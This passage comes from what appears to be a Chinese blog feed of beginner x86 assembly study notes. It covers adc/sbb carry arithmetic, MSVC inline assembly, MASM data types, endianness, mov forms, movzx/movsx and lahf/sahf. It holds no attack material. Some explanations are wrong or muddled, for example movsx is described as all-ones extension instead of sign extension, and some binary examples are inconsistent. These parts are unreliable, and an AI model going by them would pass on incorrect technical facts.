<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov dl<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111111</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">1111111</span> <span class="token operator">+</span> <span class="token number">1111111</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111110</span> 进位标志位 <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	adc dl<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">00000001</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191958729.png" alt="image-20220204191958729" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192010778.png" alt="image-20220204192010778" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192023777.png" alt="image-20220204192023777" /></p>
<h2 id="减法"><a class="anchor" href="#减法">#</a> 减法</h2>
<p>进位减法 sbb：从目的操作数减去原操作数和进位标志位的一个值</p>
<p>用 32 位操作数实现 64 位减法</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov edx<span class="token punctuation">,</span><span class="token number">7</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	sub eax<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">=</span> ffffffff</pre></td></tr><tr><td data-num="21"></td><td><pre>	sbb edx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span><span class="token number">00000006ffff</span>ffff</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192742787.png" alt="image-20220204192742787" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192759183.png" alt="image-20220204192759183" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192811307.png" alt="image-20220204192811307" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192825110.png" alt="image-20220204192825110" /></p>
]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之内联汇编</title>
    <url>/article/f2951c20.html</url>
    <content><![CDATA[<p>这么可爱的冰墩墩谁能不爱呢？</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201545182.png" alt="image-20220210201545182" /></p>
<p>-&gt; 新建项目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193415741.png" alt="image-20220210193415741" /></p>
<p>-&gt; 新建项</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193623789.png" alt="image-20220210193623789" /></p>
<p>-&gt; 文件命名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193734093.png" alt="image-20220210193734093" /></p>
<p>在 <code>main</code>  函数中使用内联汇编，通过 <code>_asm</code>  调用汇编</p>
<p><strong>单条指令</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194134521.png" alt="image-20220210194134521" /></p>
<p><strong>多条指令</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194448777.png" alt="image-20220210194448777" /></p>
<p>同时，内联汇编支持在 <code>_asm</code>  外定义变量</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194654674.png" alt="image-20220210194654674" /></p>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">// 立即数</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	_asm <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>			<span class="token comment">// 通过 mov 传送立即数</span></pre></td></tr><tr><td data-num="7"></td><td><pre>			mov ebx<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="8"></td><td><pre>			mov ecx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 还可通过 lea 传送字符串 lea esi,string</span></pre></td></tr></table></figure><p><strong>关于报错</strong></p>
<p>若运行失败，请检查运行库是否为 &quot;多线程调试&quot; 模式</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201317556.png" alt="image-20220210201317556" /></p>
<p>如此这期摸鱼就到此结束啦！</p>
<p>期待下次不可以这么摸鱼了 QAQ！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201835162.png" alt="image-20220210201835162" /></p>
]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之定义数据类型和数据传送指令学习</title>
    <url>/article/1c336d24.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/3893ead1f7e49ff9f0018e63d94d21d.jpg" alt="image-3893ead1f7e49ff9f0018e63d94d21d" /></p>
<h2 id="定义数据类型"><a class="anchor" href="#定义数据类型">#</a> 定义数据类型</h2>
<h3 id="内部数据类型"><a class="anchor" href="#内部数据类型">#</a> 内部数据类型</h3>
<h4 id="整数"><a class="anchor" href="#整数">#</a> 整数</h4>
<ul>
<li>BYTE 8 位（无符号）</li>
<li>SBYTE 8 位（有符号）</li>
<li>WORD 16 位（无符号）</li>
<li>SWORD 16 位（有符号）</li>
<li>DWORD 32 位（无符号）</li>
<li>SDWORD 32 位（有符号）</li>
<li>FWORD 48 位 保护模式中的远指针</li>
<li>QWORD 64 位 整数</li>
<li>TBYTE 80 位 整数</li>
</ul>
<h4 id="实数"><a class="anchor" href="#实数">#</a> 实数</h4>
<ul>
<li>REAL4 32 位 短实数</li>
<li>REAL8 64 位 长实数</li>
<li>REAL10 80 位 扩展实数</li>
</ul>
<h4 id="伪指令"><a class="anchor" href="#伪指令">#</a> 伪指令</h4>
<ul>
<li>db 8 位整数 相当于 C 语言中的 char 可以用来保存 ASCII</li>
<li>dw 16 位整数</li>
<li>dd 32 位 整数或实数</li>
<li>dq 64 位 整数或实数</li>
<li>dt 80 位 整数</li>
</ul>
<p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	add eax<span class="token punctuation">,</span>num</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="27"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="28"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="29"></td><td><pre>END main</pre></td></tr></table></figure><p>运行结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123195729201.png" alt="image-20220123195729201" /></p>
<p>定义数组类型</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="2"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>代码块填写格式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr></table></figure><p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>运行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123200540676.png" alt="image-20220123200540676" /></p>
<h3 id="大端序与小端序"><a class="anchor" href="#大端序与小端序">#</a> 大端序与小端序</h3>
<p>计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。</p>
<blockquote>
<ul>
<li>大端字节序：高位字节在前，低位字节在后</li>
<li>小端字节序：低位字节在前，高位字节在后</li>
</ul>
</blockquote>
<p>下面举例说明</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">01234567</span>h</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">11111111</span>h</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">22222222</span>h</pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>测试运行后，取地址查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123201813924.png" alt="image-20220123201813924" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123201932890.png" alt="image-20220123201932890" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123202447990.png" alt="image-20220123202447990" /></p>
<p>可以发现是按低位字节在前，高位字节在后的方式排序，即： <code>67 45 23 01</code>  的格式。这种称为<strong>小端序</strong>；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123203446973.png" alt="image-20220123203446973" /></p>
<p>而如果像我们正常数数的方式排列的，如： <code>01 23 45 67</code>  的格式，则称为<strong>大端序</strong>。所以也称大端序是人类读写数值的方法。</p>
<h2 id="数据传送指令"><a class="anchor" href="#数据传送指令">#</a> 数据传送指令</h2>
<h3 id="操作数类型"><a class="anchor" href="#操作数类型">#</a> 操作数类型</h3>
<ul>
<li>立即数：0，1，2，3，4，5，6，7，8，9 等</li>
<li>寄存器操作数 eax，ebx</li>
<li>内存操作数</li>
</ul>
<h3 id="寄存器操作数"><a class="anchor" href="#寄存器操作数">#</a> 寄存器操作数</h3>
<h4 id="reg通用寄存器"><a class="anchor" href="#reg通用寄存器">#</a> reg：通用寄存器</h4>
<ul>
<li>reg8：8 位</li>
<li>reg16：16 位</li>
<li>reg32：32 位</li>
</ul>
<p><strong>sreg：段寄存器</strong></p>
<h4 id="imm立即数"><a class="anchor" href="#imm立即数">#</a> imm：立即数</h4>
<ul>
<li>imm8：8 位立即数</li>
<li>imm16：16 位立即数</li>
<li>imm32：32 位立即数</li>
</ul>
<h4 id="mem内存"><a class="anchor" href="#mem内存">#</a> mem：内存</h4>
<ul>
<li>mem8：8 位内存</li>
<li>mem16：16 位内存</li>
<li>mem32：32 位内存</li>
</ul>
<h3 id="mov的用法"><a class="anchor" href="#mov的用法">#</a> mov 的用法</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov 目的操作数 源操作数</pre></td></tr></table></figure><p>mov a,15 它就相当于 C 语言中的 int a = 15，a 为目的操作数，15 为源操作数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>从寄存器到寄存器，把一个寄存器的复制到另一个寄存器</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>mov mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>把寄存器中的值拷贝到内存中</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>mov reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>把内存中的值复制到寄存器中</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>mov mem<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数拷贝到内存中</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>mov reg<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数存到寄存器中</pre></td></tr></table></figure><p>那么如何利用 mov 将较小的值传输到较大的值呢？</p>
<p>例如：将 reg16 传输到 reg32 当中</p>
<p>因为 32 寄存器存在高低位以 eax 为例，如 mov eax,cx，eax 第 16 位是 ax，而 ax 还分为 ah，al，所以说 ax 位 16 位而 al 为 8 位</p>
<p>如果要将 16 位赋值到 32 位寄存器，这个时候就要用 ax 来接收 cx，而这个时候就要对 eax 进行初始化，否则会出现不必要的错误，例如 mov eax,FFFFFFFF</p>
<p>而除了这种直接给它进行初始化方式的方法外，还存在另一种方法，通过 movzx 指令实现</p>
<p><strong>movzx 指令则是用来进行全零扩展，并进数据传送</strong></p>
<p>例如：movzx eax,cx，若此时 cx 为 1234，那么 eax 则表示为 00001234</p>
<p>二进制表示为</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">0000000010101010</span></pre></td></tr></table></figure><p>除全零扩展之外还存在全一扩展</p>
<p><strong>movsx 指令则是用来进行全一扩展，并进数据传送</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">1111111110101010</span></pre></td></tr></table></figure><h3 id="lahf"><a class="anchor" href="#lahf">#</a> LAHF</h3>
<p>LAHF 也可进行数据传送：用来加载状态标识到 ah 寄存器中，ah 为 ax 中高 8 位而 al 为低 8 位</p>
<p>lahf 是单指令运算符，无操作数，但会会 ah 的 8 位寄存器产生影响</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>lahf</pre></td></tr><tr><td data-num="2"></td><td><pre>mov flag<span class="token punctuation">,</span>ah</pre></td></tr></table></figure><h3 id="sahf"><a class="anchor" href="#sahf">#</a> SAHF</h3>
<p>sahf 会将 ah 中的值拷贝会 flag 当中，与 lahf 作用相反</p>
